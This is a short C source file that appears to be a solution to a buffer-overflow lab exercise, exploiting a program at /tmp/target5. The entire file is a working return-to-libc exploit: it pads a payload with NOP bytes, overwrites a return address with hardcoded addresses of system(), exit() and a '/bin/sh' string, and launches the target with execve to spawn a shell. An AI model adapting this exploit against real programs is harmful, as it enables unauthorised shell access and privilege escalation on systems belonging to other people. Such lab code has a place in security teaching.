#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target5"
#define NOP 0x90
#define SYS_ADDR 0xb7e54da0
#define SH_ADDR 0xb7f75a0b
#define EXIT_ADDR 0xb7e489d0

char payload[21];

void make_payload(){
  int i = 0;
  for(i = 0; i < 17; i++)
    payload[i] = NOP;


  * (unsigned long *) (payload + 8) = SYS_ADDR;

  * (unsigned long *) (payload + 12) = EXIT_ADDR;

  * (unsigned long *) (payload + 16) = SH_ADDR;

  payload[20] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}

